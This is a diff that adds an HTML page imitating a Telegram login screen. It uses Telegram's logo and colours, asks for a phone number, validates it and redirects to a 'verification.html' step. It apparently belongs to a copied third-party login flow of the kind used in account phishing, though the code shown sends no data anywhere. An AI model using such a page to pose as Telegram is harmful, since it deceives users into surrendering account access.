@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Continue with Telegram</title>
+    <style>
+      :root {
+        --bg: #0e1117;
+        --panel: #131922;
+        --line: rgba(255, 255, 255, 0.1);
+        --text: #f3f5f8;
+        --muted: #8d97a7;
+        --telegram: #2ea6ff;
+        --danger: #f6465d;
+      }
+
+      * { box-sizing: border-box; }
+
+      html, body {
+        margin: 0;
+        min-height: 100%;
+        background: var(--bg);
+        color: var(--text);
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px 16px;
+      }
+
+      .page {
+        width: min(100%, 460px);
+      }
+
+      .card {
+        background: rgba(18, 24, 32, 0.96);
+        border: 1px solid var(--line);
+        border-radius: 20px;
+        padding: 28px 22px 22px;
+        box-shadow: 0 20px 42px rgba(0, 0, 0, 0.28);
+      }
+
+      .brand {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 18px;
+      }
+
+      .brand svg {
+        width: 42px;
+        height: 42px;
+      }
+
+      .title {
+        margin: 0 0 18px;
+        text-align: center;
+        font-size: 30px;
+        line-height: 1.2;
+        font-weight: 700;
+        letter-spacing: -0.04em;
+      }
+
+      .subtitle {
+        margin: 0 0 20px;
+        text-align: center;
+        color: var(--muted);
+        font-size: 16px;
+        line-height: 1.5;
+      }
+
+      .field {
+        margin-bottom: 18px;
+      }
+
+      .label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 14px;
+        color: var(--muted);
+      }
+
+      .input-shell {
+        border: 1px solid var(--line);
+        background: rgba(255,255,255,0.02);
+        border-radius: 12px;
+        transition: border-color 0.18s ease, box-shadow 0.18s ease;
+      }
+
+      .input-shell:focus-within {
+        border-color: rgba(46, 166, 255, 0.8);
+        box-shadow: 0 0 0 3px rgba(46, 166, 255, 0.12);
+      }
+
+      .input-shell.error {
+        border-color: rgba(246, 70, 93, 0.9);
+        box-shadow: 0 0 0 3px rgba(246, 70, 93, 0.08);
+      }
+
+      input {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        color: var(--text);
+        padding: 15px 16px;
+        font-size: 16px;
+      }
+
+      input::placeholder {
+        color: var(--muted);
+      }
+
+      .warning {
+        display: none;
+        margin-top: 8px;
+        color: var(--danger);
+        font-size: 13px;
+        line-height: 18px;
+      }
+
+      .warning.show {
+        display: block;
+      }
+
+      .login-btn {
+        width: 100%;
+        border: none;
+        border-radius: 12px;
+        background: var(--telegram);
+        color: #ffffff;
+        min-height: 48px;
+        font-weight: 700;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 8px;
+      }
+
+      .login-btn:hover {
+        filter: brightness(1.04);
+      }
+
+      .footer-note {
+        margin-top: 16px;
+        text-align: center;
+        color: var(--muted);
+        font-size: 13px;
+        line-height: 1.6;
+      }
+
+      .footer-note a {
+        color: var(--telegram);
+        text-decoration: none;
+      }
+
+      @media (max-width: 480px) {
+        .card {
+          padding: 22px 18px 18px;
+        }
+
+        .title {
+          font-size: 26px;
+        }
+
+        .subtitle {
+          font-size: 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page">
+      <main class="card" aria-label="Telegram login form">
+        <div class="brand" aria-label="Telegram brand icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#00AEED" aria-hidden="true">
+            <path d="M2.81 9.27c4.47-1.95 7.46-3.23 8.95-3.85 4.26-1.77 5.15-2.08 5.72-2.09.13-.01.42.03.6.18.16.13.2.29.22.41.02.12.05.38.03.59-.23 2.43-1.23 8.32-1.74 11.04-.22 1.15-.65 1.54-1.06 1.58-1.05.08-1.71-.59-2.57-1.15-1.35-.89-2.11-1.44-3.43-2.3-1.52-.99-.49-1.54.36-2.44.23-.24 4.16-3.81 4.24-4.14.01-.04.02-.19-.09-.27-.09-.08-.22-.05-.32-.03-.14.03-2.3 1.45-6.48 4.28-.61.42-1.17.62-1.67.61-.55-.01-1.6-.3-2.38-.55-.96-.31-1.72-.48-1.65-.99.03-.28.41-.56 1.13-.85Z"></path>
+          </svg>
+        </div>
+
+        <h1 class="title">Continue with Telegram</h1>
+        <p class="subtitle">Please enter your Telegram phone number.</p>
+
+        <form id="telegramForm" novalidate>
+          <div class="field">
+            <label class="label" for="telegramPhone">Telegram number</label>
+            <div class="input-shell" id="telegramShell">
+              <input id="telegramPhone" type="tel" placeholder="+1234567890" autocomplete="tel" />
+            </div>
+            <div class="warning" id="telegramWarning">Please enter a valid Telegram phone number.</div>
+          </div>
+
+          <button type="submit" class="login-btn">Continue</button>
+        </form>
+
+        <div class="footer-note">
+          <a href="javascript:window.close();">Back</a>
+        </div>
+      </main>
+    </div>
+
+    <script>
+      const form = document.getElementById('telegramForm');
+      const input = document.getElementById('telegramPhone');
+      const shell = document.getElementById('telegramShell');
+      const warning = document.getElementById('telegramWarning');
+
+      function isValidPhone(value) {
+        const trimmed = value.trim();
+        return /^\+?[0-9]{8,15}$/.test(trimmed);
+      }
+
+      function showError() {
+        shell.classList.add('error');
+        warning.classList.add('show');
+      }
+
+      function hideError() {
+        shell.classList.remove('error');
+        warning.classList.remove('show');
+      }
+
+      input.addEventListener('input', () => {
+        if (input.value.trim() && !isValidPhone(input.value)) {
+          showError();
+        } else {
+          hideError();
+        }
+      });
+
+      form.addEventListener('submit', (event) => {
+        event.preventDefault();
+        const value = input.value.trim();
+
+        if (!isValidPhone(value)) {
+          showError();
+          input.focus();
+          return;
+        }
+
+        hideError();
+        window.location.href = 'verification.html';
+      });
+
+      input.focus();
+    </script>
+  </body>
+</html>
